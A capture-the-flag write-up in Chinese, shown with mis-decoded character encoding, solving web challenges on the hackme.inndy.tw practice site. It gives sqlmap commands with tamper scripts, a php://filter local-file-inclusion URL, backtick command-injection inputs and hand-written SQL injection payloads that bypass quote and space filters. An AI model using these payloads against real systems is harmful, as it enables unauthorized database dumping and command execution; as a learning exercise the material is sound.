# Web

## 12: hide and seek

åœ¨ä¸»é¡µä»£ç é‡Œé¢ï¼Œæœç´¢ FLAG å³å¯ã€‚

## 13: guestbook

> [sqlmap](http://sqlmap.org/)Â is your friend.

æ‰€ä»¥è®©æˆ‘ä»¬çš„ã€Œå¥½æœ‹å‹ã€å‡ºåœºå§ã€‚

æœ€ç»ˆå¯ä»¥å‘ç°ï¼Œ`https://hackme.inndy.tw/gb/?mod=read&id=10` ä¸­çš„ `id` å‚æ•°å¯ä»¥ SQL æ³¨å…¥ã€‚äºæ˜¯æœ€ç»ˆçš„ payload:

```shell
sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&id=10" -p id --dbs -D g8 --dump
```

## 14: LFI

LFI æ˜¯ä»€ä¹ˆï¼Ÿå®ƒæ˜¯ Local File Inclusionï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰çš„ç¼©å†™ã€‚

å¯ä»¥è§‚å¯Ÿåˆ°è¯¥é¢˜çš„ URL å¦‚ä¸‹ï¼š

```
https://hackme.inndy.tw/lfi/?page=pages/index
https://hackme.inndy.tw/lfi/?page=pages/intro
https://hackme.inndy.tw/lfi/?page=pages/login
https://hackme.inndy.tw/lfi/?page=pages/flag
```

å› æ­¤å¯ä»¥çŒœæµ‹ï¼Œ`page` å‚æ•°å¯ä»¥ä¼šæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ã€‚è®¿é—® `https://hackme.inndy.tw/lfi/?page=notfound`ï¼ˆä¸å­˜åœ¨çš„æ–‡ä»¶ï¼‰å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå°å½©è›‹ 233333ã€‚

ç›´æ¥è®¿é—® `https://hackme.inndy.tw/lfi/?page=pages/flag` å¾—ä¸åˆ°ä»»ä½•ä¸œè¥¿ã€‚æ ¹æ®æç¤º `php://filter`ï¼Œå¯ä»¥æ„é€ ï¼š

```
https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag
```

å°†å¾—åˆ°çš„å†…å®¹ç”¨ base64 è§£ç ï¼Œå¾—åˆ°ï¼š

```php+HTML
Can you read the flag<?php require('config.php'); ?>?
```

emmm é‚£çœ‹çœ‹ `config.php` é‡Œé¢æ˜¯ä»€ä¹ˆå§ã€‚Payload:

```
https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config
```

è§£ç åå³å¯å¾—åˆ° flagã€‚

## 15: homepage

ä¸»é¡µä¸­å¼•ç”¨äº† `https://hackme.inndy.tw/cute.js`ï¼Œå¤åˆ¶ä¸‹æ¥åœ¨æ§åˆ¶å°é‡Œè¿è¡Œç„¶åæ‰«ç å³å¯ã€‚

## 16: ping

æºä»£ç æ˜¾ç¤ºè¿™ä¸ªç¨‹åºä¼šå¯¹è¾“å…¥è¿›è¡Œæ£€æµ‹ï¼Œç„¶åæ‰§è¡Œ `ping`ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œè€Œä¸æ˜¯çœŸå»  `ping`ã€‚PHP ä¸­çš„ `exec()` æœ‰ç‚¹åƒ C åº“çš„ `system()`ï¼Œéƒ½æ˜¯è°ƒç”¨ç³»ç»Ÿ shell æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸æ˜¯ç›´æ¥å» `execve()`ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨å‚æ•°ä¸­åŠ ä¸€ç‚¹ä¸œè¥¿ï¼Œè®© shell æ‰§è¡Œå¼€å‘è€…æ„æ–™ä¹‹å¤–çš„å‘½ä»¤ã€‚æœ‰ä¸€äº›é™åˆ¶æ¡ä»¶ï¼š

- æˆ‘ä»¬çš„ payload ä¸èƒ½è¶…è¿‡ 15 ä¸ªå­—ç¬¦ã€‚
- ä¸€äº›ç‰¹å®šçš„å•è¯ã€ç¬¦å·ä¸èƒ½å¤Ÿå‡ºç°ã€‚

è™½ç„¶å¾ˆå¤šå¸¸è§çš„ç¬¦å·è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯ `` ` `` æ²¡æœ‰è¢«è¿‡æ»¤æ‰ã€‚

å¯ä»¥çœ‹çœ‹ç›®å½•ä¸‹é¢æœ‰ä»€ä¹ˆï¼š

```
`ls`
```

è¿”å›ï¼š

```
ping: unknown host flag.php
index.php
```

å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥çœ‹ `flag.php` çš„å†…å®¹ï¼Œä½†æ˜¯ `cat` è¢«è¿‡æ»¤äº†ã€‚æ‰€ä»¥è€ƒè™‘ç”¨ `head` æˆ–è€… `tail` æ¥æŸ¥çœ‹ flag.phpã€‚`flag` è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨é€šé…ç¬¦ã€‚

Payload:

```
`tail f*`
```

## 17: scoreboard

è®°åˆ†æ¿é¡µé¢éšè—ç€æ€æ ·çš„ç§˜å¯†ï¼ŸæŸ¥çœ‹æºä»£ç ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ã€‚è½¬å‘ç½‘ç»œè¯·æ±‚ï¼Œå‘ç°è¿”å›å¤´çš„ `x-flag` å‚æ•°å°±æ˜¯æˆ‘ä»¬è¦çš„ flagã€‚

## 18: login as admin 0

è¿™é‡Œæˆ‘ä»¬ä»ç„¶å°è¯•ä½¿ç”¨ `sqlmap`ï¼Œä½†å¦‚æœç›´æ¥è°ƒç”¨ `sqlmap`ï¼Œä¼šå‘ç°æ²¡æœ‰åŠæ³•æ³¨å…¥ã€‚

æ‰€ä»¥æˆ‘ä»¬éœ€è¦ tamperã€‚`sqlmap` å†…ç½®çš„ä¸€äº› tamper å¯ä»¥åœ¨ç½‘ç»œä¸ŠæŸ¥æ‰¾åˆ°ä»‹ç»ï¼Œè¿™é‡Œä¸å†å™è¿°ã€‚

æºä»£ç ä¸­ã€Œè¿‡æ»¤è¯·æ±‚ã€çš„éƒ¨åˆ†å¦‚ä¸‹ï¼š

```php
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}
```

å¯ä»¥æ³¨æ„åˆ°ï¼Œè™½ç„¶æˆ‘ä»¬çš„è¯·æ±‚å­—ç¬¦ä¸²åœ¨è½¬æ¢ä¸ºå°å†™åä¸­å¦‚æœæœ‰ `or 1=1` ç­‰å­—ç¬¦ä¸²æ—¶æ•´ä¸ªè¯·æ±‚ä¼šè¢«æ¸…ç©ºï¼Œä½†æ˜¯å…¶ä»–è¢«ç›´æ¥è¿‡æ»¤çš„å­—ç¬¦ä¸²ä¼šæ”¹å˜æ•°æ®åº“çš„å†…å®¹ï¼Œä½†æˆ‘ä»¬çš„æ³¨å…¥ä¸ä¼šï¼ˆä¹Ÿä¸åº”è¯¥ï¼‰æ”¹å˜æ•°æ®åº“ã€‚æ‰€ä»¥æœ€å…³é”®çš„éƒ¨åˆ†æ˜¯ç¬¬ä¹è¡Œï¼Œå°† `'` æ›¿æ¢ä¸º `\'` è¿™**ä¸¤ä¸ªå­—ç¬¦**ï¼ˆä¸æ˜¯æ›¿æ¢æˆ `\\'` ä¸‰ä¸ªå­—ç¬¦ï¼å¯ä»¥åœ¨ PHP çš„ REPL é‡Œé¢äº²è‡ªè¯•ä¸€ä¸‹ã€‚ï¼‰ï¼Œå³å°è¯•è½¬ä¹‰è¯·æ±‚å­—ç¬¦ä¸²ä¸­çš„ `'`ã€‚

ä½†å¦‚æœæˆ‘ä»¬çš„è¾“å…¥æ˜¯ `\'` å‘¢ï¼Ÿåœ¨è¯¥å‡½æ•°è¿‡æ»¤ä¹‹åç»“æœå°±æ˜¯ `\\'`ã€‚å¯ä»¥å‘ç°ï¼Œ`\` è¢«è½¬ä¹‰äº†ï¼Œä½†æ˜¯ `'` æ²¡æœ‰ã€‚

æŸ¥æ‰¾èµ„æ–™å¯ä»¥å‘ç°ï¼Œ`sqlmap` è‡ªå¸¦çš„ tamper `escapequotes.py` å¯ä»¥åƒè¿™æ ·è½¬ä¹‰å¼•å·ã€‚è¯¥ tamper çš„æ ¸å¿ƒä»£ç ï¼š

```python
return payload.replace("'", "\\'").replace('"', '\\"')
```

åŒæ ·ï¼Œå®ƒå°† `sqlmap` äº§ç”Ÿçš„ payload è¿›è¡Œå¤„ç†ï¼Œå°† `'` æ›¿æ¢ä¸º `\'` ï¼ˆ**ä¸¤ä¸ª**å­—ç¬¦ï¼‰ï¼Œå°† `"` æ›¿æ¢ä¸º `\"`ã€‚

æ‰€ä»¥ç…§æ ·ç”¨ `sqlmap`ï¼ŒåŠ ä¸Š tamper å°±å¯ä»¥äº†ã€‚

Payload:

```shell
sqlmap -u "https://hackme.inndy.tw/login0/" --data="name=admin&password=bbb" --dbms=MySQL --tamper="escapequotes" -p password --dbs -D login_as_admin0 --columns --dump
```

è·å¾— admin å¯†ç ï¼Œç™»å½•å³å¯ã€‚

## 19: login as admin 0.1

éå¸¸æ€ªå¼‚çš„æ˜¯ï¼Œ`sqlmap` æ— æ³•å¾—åˆ°è¡¨ `h1dden_f14g` ä¸­ `the_f14g` çš„å†…å®¹ã€‚

æˆ‘ä»¬åŠ ä¸Š `-v3` å‚æ•°æ¥æ˜¾ç¤ºè¯¦ç»†çš„ payloadã€‚æ­¤å¤„å‡ºç°é—®é¢˜çš„ payload å¦‚ä¸‹ï¼š

```
bbb\' UNION ALL SELECT NULL,CONCAT(0x716a7a6271,IFNULL(CAST(the_f14g AS CHAR),0x20),0x7176707671),NULL,NULL FROM login_as_admin0.h1dden_f14g ORDER BY the_f14g-- jdWz
```

ä»ä¹‹å‰ `sqlmap` çš„ç»“æœå¯ä»¥çŸ¥é“è¡¨ `user` æœ‰ 4 åˆ—ï¼Œç¬¬äºŒåˆ— `user` ä¼šå›æ˜¾åœ¨ç™»å½•æˆåŠŸçš„é¡µé¢ä¸Šã€‚å¹¶ä¸”å¯çŸ¥ flag åªæœ‰ä¸€ä¸ªã€‚æ‰€ä»¥ç®€åŒ–ä¸ºï¼š

```
bbb\' UNION SELECT 1,CAST(the_f14g AS CHAR),3,4 FROM login_as_admin0.h1dden_f14g-- ddd
```

ç™»å½•åå³å¯è·å¾— flagã€‚

## 20: login as admin 1

è¯¥é¢˜æç¤ºä¸èƒ½ä½¿ç”¨ `sqlmap`ã€‚åˆæµ‹äº†ä¸€ä¸‹ï¼Œç¡®å®ä¸è¡Œã€‚ä½†æ˜¯è§‚å¯Ÿä»£ç ï¼Œå¯ä»¥æ ¹æ®ç¬¬ 19 é¢˜çš„ payload ä¿®æ”¹ã€‚

å¯ä»¥æ³¨æ„åˆ°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ç”¨æ³¨é‡Š `/**/` ä»£æ›¿ç©ºæ ¼å°±å¯ä»¥äº†ã€‚

å¯†ç å­—æ®µçš„ payload:

```
bbb\'/**/UNION/**/SELECT/**/1,2,3,4#
```

## 21: login as admin 1.2

æç¤ºå¸ƒå°”ç›²æ³¨ã€‚å¦‚æœä¹‹å‰è¯•è¿‡ç»™ `sqlmap` åŠ ä¸Šéšæœº UAï¼Œå†™ tamper æ”¹å˜ç»“å°¾æ³¨é‡Šï¼ˆå¦‚æœç»“å°¾æ˜¯ `-- xxxx` çš„è¯ä¼¼ä¹ä¼šå¤±è´¥ï¼‰çš„è¯ï¼Œä¼šå‘ç° `sqlmap` æ‰¾åˆ°äº†æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰åŠæ³•çˆ†ç ´ã€‚

åŸå› åœ¨äºï¼Œåœ¨ç¬¬ 18 é¢˜ä¸­ï¼Œç™»å½•æˆåŠŸè¿”å›é¡µé¢ï¼š

```php+HTML
<h3>Hi, <?=htmlentities($user->user)?></h3>
```

è€Œè¯¥é¢˜ä¸­çš„ç™»å½•æˆåŠŸè¿”å›é¡µé¢ï¼š

```php+HTML
<h3>Hi, <?=htmlentities($_POST['name'])?></h3>
```

æ²¡æœ‰åœ°æ–¹å¯ä»¥ç»™ `union select` æ³¨å…¥è¿”å›æ•°æ®ã€‚é‚£ä¹ˆå¸ƒå°”ç›²æ³¨æ˜¯æ€ä¹ˆåšåˆ°çš„å‘¢ï¼Ÿ

å¯»æ‰¾å¸¸è§çš„å¸ƒå°”ç›²æ³¨æµ‹è¯•çš„ payload å¯ä»¥å‘ç°ï¼Œå½“å¯†ç å­—æ®µå¦‚ä¸‹æ—¶ï¼ˆåˆ¤æ–­ MySQL å¤§ç‰ˆæœ¬æ˜¯å¦ä¸º 5ï¼‰ï¼š

```
b\'/**/or/**/left(version(),1)=5#
```

å¯ä»¥ç™»å½•ã€‚ä½†å¦‚æœç¨ä½œä¿®æ”¹ï¼š

```
b\'/**/or/**/left(version(),1)=4#
```

å°±æ— æ³•ç™»å½•ã€‚æ¢è¨€ä¹‹ï¼Œæˆ‘ä»¬åšåˆ°äº†åˆ¤æ–­ MySQL çš„å¤§ç‰ˆæœ¬å·ã€‚

æ¥ä¸‹æ¥å‘¢ï¼Ÿç›²æ³¨è‡ªå·±å¼„çœŸçš„å¤ªéº»çƒ¦äº†ï¼Œæˆ‘åˆä¸æƒ³å†™è„šæœ¬ï¼Œæ‰€ä»¥å°±â€¦â€¦`sqlmap` å§ã€‚

å½“ç„¶ç›´æ¥ç¡¬æ¥è‚¯å®šæ˜¯ä¸å¯ä»¥çš„ï¼Œéœ€è¦ç»™ `sqlmap` åŠ ä¸€äº›å‚æ•°æŒ‡å¯¼ï¼Œæœ€ç»ˆå‘½ä»¤å¦‚ä¸‹ï¼š

```shell
sqlmap -u https://hackme.inndy.tw/login1/ --data "name=guest&password=guest" -p password --random-agent --dbms=MySQL --tamper="my_tamper.py,escapequotes,space2comment" -v 3 --technique B --risk=3 --level=5 --string "are not" --dbs -D login_as_admin1 --columns -o --threads 10 --dump
```

å…¶ä¸­ï¼š

- `--random-agent`: éšæœºåŒ– UAã€‚`sqlmap` é»˜è®¤ UA ç›´æ¥æš´éœ²äº†è‡ªå·±æ˜¯æ‰«æå™¨çš„äº‹å®ï¼Œå› ä¸ºæºä»£ç ä¸­æœ‰ UA è¿‡æ»¤ï¼Œæ‰€ä»¥åŠ ä¸Šäº†æ­¤å‚æ•°ã€‚
- `--technique B`: è¦æ±‚åªä½¿ç”¨å¸ƒå°”ç›²æ³¨ã€‚
- `--risk=3 --level=5`: å¦‚æœä¸ç”¨çš„è¯ `sqlmap` ä¸ä¼šæµ‹è¯• `OR boolean-based injection `ã€‚
- `--string "are not"`: æŒ‡ç¤ºå¸ƒå°”ç›²æ³¨æ—¶å¸ƒå°”å€¼ä¸ºçœŸæ—¶é¡µé¢æ‹¥æœ‰çš„å­—ç¬¦ä¸²ã€‚
- `-o --threads 10`: ä¼˜åŒ–è¿è¡Œé€Ÿåº¦ï¼ˆå¸ƒå°”ç›²æ³¨æ¯”è¾ƒæ…¢ï¼‰ã€‚

tamper `my_tamper.py` å†…å®¹å¦‚ä¸‹ï¼š

```python
def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    replaces comment at end to #
    """

    return payload.replace("-- ", "#")
```

## 22: login as admin 3

æˆ‘ä»¬æ€»ç®—æ˜¯é€ƒè„±äº† SQL æ³¨å…¥çš„è‹¦æµ·ğŸ˜‚ã€‚

